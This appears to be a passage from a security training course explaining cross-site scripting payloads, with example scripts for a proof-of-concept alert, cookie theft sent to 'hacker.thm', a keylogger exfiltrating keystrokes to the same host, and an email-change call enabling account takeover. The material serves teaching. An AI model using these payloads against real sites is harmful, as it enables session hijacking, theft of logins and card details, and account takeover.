In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

Here are some examples of XSS intentions.

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

Now that the email address for the account has changed, the attacker may perform a reset password attack.
